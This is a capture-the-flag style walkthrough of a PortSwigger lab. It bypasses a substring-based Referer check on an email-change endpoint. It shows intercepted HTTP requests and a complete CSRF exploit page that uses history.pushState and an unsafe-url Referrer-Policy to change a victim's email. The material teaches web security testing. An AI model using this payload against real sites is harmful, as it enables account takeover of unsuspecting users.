## CSRF with broken Referer validation

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross-domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Exploit server
- /login
- Referer validation flaw
- Domain substring check bypass

## Resume

1. Identify CSRF endpoint  
2. Test Referer validation  
3. Bypass Referer strict matching  
4. Exploit substring-based validation  
5. Build CSRF PoC  
6. Force Referer override using Referrer-Policy  
7. Deliver exploit  

## Solve

We first intercept the email change request after logging in:

```http
POST /my-account/change-email HTTP/2
Host: 0ae2006104fd1c22802903900009009e.web-security-academy.net
Cookie: session=IbPRcw1HBONVC3jYicDMSXMXXmM02gps
Referer: https://0ae2006104fd1c22802903900009009e.web-security-academy.net/my-account?id=wiener

email=toto%40toto.com
```

We confirm that no CSRF token is used.

Next, we test Referer validation behavior.

If we remove the Referer header entirely:

```http
POST /my-account/change-email HTTP/2
Host: 0ae2006104fd1c22802903900009009e.web-security-academy.net
Cookie: session=IbPRcw1HBONVC3jYicDMSXMXXmM02gps

email=toto%40toto.com
```

Response:

```http
HTTP/2 400 Bad Request
"Invalid referer header"
```

If we use an arbitrary Referer:

```http
Referer: https://test.com
```

The request is still rejected.

However, we notice that the validation is flawed: it only checks whether the expected domain appears somewhere in the Referer string.

We confirm this by sending:

```http
Referer: http://test.com/csrf-attack?0ae2006104fd1c22802903900009009e.web-security-academy.net
```

Response:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
```

This proves the check can be bypassed using a Referer containing the domain as a substring.

To exploit this, we craft a CSRF proof of concept.

We force the Referer header to include the target domain by manipulating `history.pushState()`:

```html
<script>
  history.pushState('', '', '/?0ae2006104fd1c22802903900009009e.web-security-academy.net');
</script>
```

Final exploit:

```html
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
    <meta http-equiv="Referrer-Policy" content="unsafe-url">
  </head>

  <body>
    <form action="https://0ae2006104fd1c22802903900009009e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@portswigger.net">
    </form>

    <p>Click anywhere on the page</p>

    <script>
      history.pushState('', '', '/?0ae2006104fd1c22802903900009009e.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

The `Referrer-Policy: unsafe-url` ensures the full URL (including query string) is sent in the Referer header, allowing the backend substring check to pass.

When the victim loads the page:
- The Referer contains the expected domain
- CSRF validation is bypassed
- The email change request is accepted

The lab is solved when the victim’s email address is changed.